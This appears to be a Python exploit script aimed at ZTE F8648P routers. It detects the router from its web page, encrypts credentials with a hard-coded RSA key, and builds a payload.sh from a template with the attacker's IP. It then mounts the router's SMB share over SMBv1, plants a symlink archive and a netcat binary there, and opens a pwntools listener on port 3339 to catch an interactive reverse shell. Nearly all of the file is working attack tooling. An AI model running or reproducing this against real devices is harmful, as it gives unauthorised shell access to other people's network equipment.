from hashlib import sha256
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5 as Cipher_PKCS1_v1_5
from Crypto.Cipher import AES
from base64 import b64decode,b64encode
from random import randint
from Crypto.Util.Padding import pad
import socket
import subprocess
from time import sleep
import struct

def checkheader(form):
    check = str(sha256(form.encode()).hexdigest())
    pubkey = 'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAodPTerkUVCYmv28SOfRV7UKHVujx/HjCUTAWy9l0L5H0JV0LfDudTdMNPEKloZsNam3YrtEnq6jqMLJV4ASb1d6axmIgJ636wyTUS99gj4BKs6bQSTUSE8h/QkUYv4gEIt3saMS0pZpd90y6+B/9hZxZE/RKU8e+zgRqp1/762TB7vcjtjOwXRDEL0w71Jk9i8VUQ59MR1Uj5E8X3WIcfYSK5RWBkMhfaTRM6ozS9Bqhi40xlSOb3GBxCmliCifOJNLoO9kFoWgAIw5hkSIbGH+4Csop9Uy8VvmmB+B3ubFLN35qIa5OG5+SDXn4L7FeAA5lRiGxRi8tsWrtew8wnwIDAQAB'
    keyDER = b64decode(pubkey)
    keyPub = RSA.importKey(keyDER)
    cipher = Cipher_PKCS1_v1_5.new(keyPub)
    cipher_text = cipher.encrypt(check.encode())
    checkb64b = b64encode(cipher_text)
    checkb64 = checkb64b.decode()
    return(checkb64)

def randkeyiv():
    s = ''
    for i in range(16):
        s = s + str(randint(0,9))
    return s

def encodepass(passwd):
    key = randkeyiv()
    iv = randkeyiv()
    encodedata = "{}+{}".format(key,iv)
    pubkey = 'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAodPTerkUVCYmv28SOfRV7UKHVujx/HjCUTAWy9l0L5H0JV0LfDudTdMNPEKloZsNam3YrtEnq6jqMLJV4ASb1d6axmIgJ636wyTUS99gj4BKs6bQSTUSE8h/QkUYv4gEIt3saMS0pZpd90y6+B/9hZxZE/RKU8e+zgRqp1/762TB7vcjtjOwXRDEL0w71Jk9i8VUQ59MR1Uj5E8X3WIcfYSK5RWBkMhfaTRM6ozS9Bqhi40xlSOb3GBxCmliCifOJNLoO9kFoWgAIw5hkSIbGH+4Csop9Uy8VvmmB+B3ubFLN35qIa5OG5+SDXn4L7FeAA5lRiGxRi8tsWrtew8wnwIDAQAB'
    keyDER = b64decode(pubkey)
    keyPub = RSA.importKey(keyDER)
    cipher = Cipher_PKCS1_v1_5.new(keyPub)
    cipher_text = cipher.encrypt(encodedata.encode())
    encodeb = b64encode(cipher_text)
    encode = encodeb.decode()
    bkey = sha256(key.encode("utf8")).digest()
    biv = sha256(iv.encode("utf8")).digest()
    aes_cipher = AES.new(bkey, AES.MODE_CBC, biv[:16])
    passwdb = bytes(passwd,'utf8')
    while len(passwdb) % 16 != 0:
        passwdb += b'\x00'
    cipherpass = aes_cipher.encrypt(passwdb)
    cipherpassb64 = b64encode(cipherpass)
    return(encode,cipherpassb64)

def composekey(mac,serial):
    serialp = serial.split('cdd')
    firstpart = "CDD{}".format(serialp[1])
    macp = mac.split(':')
    secondpart = "{}{}{}{}{}{}".format(macp[5],macp[4],macp[3],macp[2],macp[1],macp[0])
    print("[Config Key]: {}{}".format(firstpart,secondpart))
    return("{}{}".format(firstpart,secondpart))

def getlanip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0)
    try:
        s.connect(('10.254.254.254', 1))
        IP = s.getsockname()[0]
    except Exception:
        print("[Getlanip]: Unable to retrieve local address")
    finally:
        s.close()
    print("[Getlanip]: Acquired local IP {}".format(IP))
    return IP

def prepare_payload(ip,nousb):
    skel = open("payload.skel","r")
    genpayload = open("payload.sh","w")
    for line in skel:
        if nousb == True:
            a = line.replace("[PLACEHOLDER1]","/mnt")
        else:
            a = line.replace("[PLACEHOLDER1]","/mnt/usb1_1_1")
        a = a.replace("[PLACEHOLDER2]",ip)
        genpayload.write(a)
    print("[Prepare_payload]: payload.sh ready")

def prepare_testsmb(nousb):
    skel = open("test.smb.skel","r")
    genpayload = open("test.smb.conf","w")
    for line in skel:
        if nousb == True:
            a = line.replace("[PLACEHOLDER1]","/mnt")
        else:
            a = line.replace("[PLACEHOLDER1]","/mnt/usb1_1_1")
        genpayload.write(a)
    print("[Prepare_testsmb]: test.smb.conf ready")

def getshell():
    from pwn import listen
    l = listen(3339)
    line = l.recvline()
    if line == b'\n':
        pass
    else:
        print(line)
    l.interactive()

def nousb_run(host):
    print("[nousb]: Waiting 2 seconds for server startup...")
    sleep(2)
    subprocess.run(['mkdir','-p','dest'])
    print("[nousb]: Created dest/ mountpoint")
    a = subprocess.run(['mount','-t','cifs','-o','username=test,password=test,vers=1.0','\\\\'+host+'\\samba','dest'])
    if a.returncode != 0:
        print("[nousb]: Ensure that cifs-utils package is installed on the system or samba already mounted. Stopping")
        exit(0)
    print("[nousb]: Mounted router smb on dest/")
    sleep(1)
    subprocess.run(['unzip','-oqq','symlink.zip','-d','dest/'],capture_output=False, stderr=subprocess.DEVNULL)
    print("[nousb]: Symlink copied")
    subprocess.run(['cp','../bin/nc','dest/'])
    print("[nousb]: Nc copied")
    sleep(1)
    subprocess.run(['umount','dest'])
    print("[nousb]: Unmounted router smb")
    subprocess.run(['rm','-rf','dest'])
    print("[nousb]: Deleted dest/ mountpoint")



def getgateway():
    """Read the default gateway directly from /proc."""
    with open("/proc/net/route") as fh:
        for line in fh:
            fields = line.strip().split()
            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                # If not default route or not RTF_GATEWAY, skip it
                continue

            return str(socket.inet_ntoa(struct.pack("<L", int(fields[2], 16))))

def detectrouterip(r,host):
    a = getgateway()
    print("[detect_router]: Checking if default gateway ({}) is a ZTE F8648P router".format(a))
    z = r.get("http://{}/".format(a))
    if '<span id="pdtVer">&#70;&#56;&#54;&#52;&#56;&#80;</span>' in z.text:
        print("[detect_router]: It looks like {} is a ZTE F8648P router".format(a))
        return(a)
    else:
        print("[detect_router]: No match. Falling back to manual router IP input")
        print("What is the router IP? [default: {}]".format(host))
        routerip = str(input())
        if routerip != '':
            return(routerip)


